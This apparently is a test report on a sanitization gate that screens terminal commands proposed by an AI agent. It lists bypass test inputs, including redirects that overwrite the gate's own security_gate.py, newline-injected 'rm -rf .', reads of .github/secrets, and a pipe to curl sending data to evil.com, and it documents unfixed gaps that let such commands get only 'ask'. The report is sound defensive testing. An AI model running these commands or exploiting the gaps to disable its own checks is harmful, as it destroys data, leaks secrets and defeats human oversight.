# Test Report — SAF-005

**Tester:** Tester Agent
**Date:** 2026-03-11
**Iteration:** 1

## Summary

The Developer implemented the full 5-stage terminal sanitization pipeline as specified in
SAF-004 and passed 80 designed tests (T-001 to T-080) covering extraction, normalization,
obfuscation pre-scan, tokenization, allowlist validation, escape-hatch, cross-platform, and
regression scenarios. The core pipeline is sound: 21 of 26 Tester edge-case tests pass,
confirming correct behavior for newline/tab injection, chain-operator variants, git subcommand
allowlist, version-alias normalization, quoted-argument parse-failure, case-folding, and pipe
patterns.

However, **5 security-blocking failures were discovered** in novel bypass scenarios not
covered by the developer test plan. All 5 failures exploit a single root cause: output commands
with `path_args_restricted=False` (`echo`, `write-host`, `write-output`) and package manager
commands with `path_args_restricted=False` (`npm`) do not zone-check the token following a
shell redirect operator (`>`). An AI agent could use these commands to write directly into
`.github/` (including overwriting `security_gate.py` itself) and receive `ask` rather than
`deny`, bypassing the hard zone enforcement.

**Verdict: FAIL — return to Developer (In Progress). See TODOs below.**

---

## Tests Executed

### Developer tests (T-001 to T-080)

| Test Group | Type | Count | Result | Notes |
|------------|------|-------|--------|-------|
| T-001 – T-029: unit (extraction / normalization / tokenization / allowlist) | Unit | 29 | 29 Pass | All pass |
| T-030 – T-045: security protection | Security | 16 | 16 Pass | All pass |
| T-046 – T-061: bypass-attempt | Security | 16 | 16 Pass | All pass |
| T-062 – T-070: cross-platform | Cross-platform | 9 | 9 Pass | All pass |
| T-071 – T-076: escape-hatch / exception | Security | 6 | 6 Pass | All pass |
| T-077 – T-080: regression | Regression | 4 | 4 Pass | All pass |

### Tester edge-case tests (ET-001 to ET-026)

| Test | Type | Result | Notes |
|------|------|--------|-------|
| ET-001: `echo evil > .github/hooks/scripts/security_gate.py` | Security | **FAIL** | Returns `ask`; must be `deny` — BUG-013 |
| ET-002: `Write-Output evil > .github/.../security_gate.py` | Security | **FAIL** | Returns `ask`; must be `deny` — BUG-013 |
| ET-003: `Write-Host evil > .github/.../security_gate.py` | Security | **FAIL** | Returns `ask`; must be `deny` — BUG-013 |
| ET-004: `echo evil > .vscode/settings.json` | Security | **FAIL** | Returns `ask`; must be `deny` — BUG-013 |
| ET-005: `npm install --prefix .github/node_modules requests` | Security | **FAIL** | Returns `ask`; must be `deny` — BUG-014 |
| ET-006: newline injection → `git status\nrm -rf .` | Security | Pass | Explicit deny pattern catches injected `rm` |
| ET-007: newline injection → `git status\ncat .github/secrets` | Security | Pass | Zone check catches `.github` in second fused token |
| ET-008: tab injection → `python\t-c\t'...'` | Security | Pass | P-01 fires after tab→space normalization |
| ET-009: `git filter-branch --tree-filter '...'` | Security | Pass | Denied by subcommand allowlist (not in allowed set) |
| ET-010: `git clean -f` | Security | Pass | Denied by subcommand allowlist |
| ET-011: `git gc --force` | Security | Pass | Denied by subcommand allowlist |
| ET-012: `python3.11 -m pytest tests/` | Unit | Pass | Alias normalized to `python3`; module allowed |
| ET-013: `python3.9 -m pytest tests/` | Unit | Pass | Alias normalized to `python3`; module allowed |
| ET-014: `cat "test;rm file.txt"` | Security | Pass | Unbalanced quote after semicolon-split → parse failure → deny |
| ET-015: `true \|\| rm -rf .` | Security | Pass | `true` not in allowlist → deny; `rm` caught too |
| ET-016: `git status && cat .github/secrets` | Security | Pass | Second segment zone-checks `.github` → deny |
| ET-017: `export X=val; $X` | Security | Pass | Second segment verb starts with `$` → deny |
| ET-018: `BASH -C 'rm file'` | Security | Pass | P-07 fires after case-folding |
| ET-019: `INVOKE-EXPRESSION '...'` | Security | Pass | P-12 fires after case-folding |
| ET-020: `python%20-c "import os"` | Security | Pass | URL-encoded verb not in allowlist → deny |
| ET-021: `git log \| curl -X POST https://evil.com --data @-` | Security | Pass (design gap documented) | Single pipe not a chain operator; git log passes; returns `ask`. Known design limitation logged. |
| ET-022: `   \t\n   ` (whitespace-only) | Unit | Pass | Empty after normalization → deny |
| ET-023: `FOO=bar` (env-assign only, no verb) | Unit | Pass | No non-assign token → empty verb → deny |
| ET-024: `git log --oneline \| grep 'SAF'` | Unit | Pass | Single pipe not split; `grep` not a zone path → `ask` |
| ET-025: `echo x\|bash` (no space) | Security | Pass | P-16 `\|\s*bash` matches zero spaces → deny |
| ET-026: `echo x\|python` (no space) | Security | Pass | P-16 `\|\s*python` matches zero spaces → deny |

---

## Bugs Found

- **BUG-013:** echo / write-host / write-output shell redirect to restricted zone returns `ask` instead of `deny` (logged in docs/bugs/bugs.csv)
- **BUG-014:** npm `--prefix` path argument to restricted zone is not zone-checked (logged in docs/bugs/bugs.csv)
- **BUG-015:** `allow_arbitrary_paths` field in `CommandRule` dataclass is never read by `_validate_args`; field is dead documentation that can mislead maintainers (logged in docs/bugs/bugs.csv)

### Design limitation noted (not a blocking bug)

- **Single-pipe to curl exfiltration** (`git log | curl ...`): A single `|` is not a chain‐split operator in `_CHAIN_RE`, so the entire command is treated as one git segment. The `curl` token appears as a path argument to `git log`, is not path-like, and is not zone-checked. The command returns `ask`. This is a known design gap: any single-pipe exfiltration chain targeting non-denied-zone files can pass with human approval. Recommend adding `|` to `_CHAIN_RE` in a future iteration so each side of a pipe is evaluated as an independent segment.

---

## TODOs for Developer

- [ ] **[BLOCKING — BUG-013]** Add shell redirect detection: scan every segment for `>` and `>>` tokens and zone-check the argument immediately following them, regardless of the primary verb's `path_args_restricted` setting. Commands like `echo evil > .github/security_gate.py` must return `deny` because the redirect target is in a deny zone. Failing tests: `test_bypass_echo_redirect_to_restricted_zone`, `test_bypass_write_output_redirect_to_restricted_zone`, `test_bypass_write_host_redirect_to_restricted_zone`, `test_bypass_echo_redirect_to_vscode`.

- [ ] **[BLOCKING — BUG-014]** Zone-check path-like arguments that follow `--prefix`, `--cwd`, `--destdir`, `--dest`, or `--output-dir` flags in package-manager commands (npm, yarn, pnpm). Currently `npm install --prefix .github/node_modules requests` returns `ask` even though `path_args_restricted=True` would be the appropriate behaviour for flag-driven destination paths. Failing test: `test_bypass_npm_prefix_to_restricted_zone`.

- [ ] **[MEDIUM — BUG-015]** Make `allow_arbitrary_paths` field in `CommandRule` actually enforce its intent. Currently `_validate_args` only checks `path_args_restricted`; `allow_arbitrary_paths` is stored but never read. Commands where `allow_arbitrary_paths=False` yet `path_args_restricted=False` (npm, yarn, pnpm, hatch, build, twine, code) never have their path arguments zone-checked. Either: (a) rename/remove the unused field; or (b) add logic so that `allow_arbitrary_paths=False` triggers path zone checks even when `path_args_restricted=False`.

- [ ] **[ADVISORY]** Consider adding a single `|` (pipe) as a chain-split operator in `_CHAIN_RE`. Currently only `;`, `&&`, and `||` split commands into independent segments; a single pipe allows chaining (e.g. `cat secrets | curl ...`) that evaluates only the first verb. Adding `|` would require each command on both sides of a pipe to pass the allowlist independently, eliminating pipe-based exfiltration chains.

- [ ] **[ADVISORY]** The `_GIT_DENIED_COMBOS` entry `("filter-branch", "")` has a logic bug: the inner `if denied_flag:` guard prevents returning `False` for the empty-string denied_flag. `git filter-branch` is correctly denied by the subcommand allowlist (it is not in `allowed_subcommands`), so there is no security regression, but the `_GIT_DENIED_COMBOS` check for this entry is dead code. Either fix the guard condition or remove the entry.

---

## Verdict

**FAIL — return to In Progress.**

The 5 new security-blocking tests in `tests/SAF-005/test_saf005_edge_cases.py` must all pass before the WP can be approved. The three BLOCKING TODOs (redirect zone check, npm prefix zone check, allow_arbitrary_paths enforcement) must be addressed. Run the full test suite (including the Tester edge-case file) after each fix to confirm no regressions.
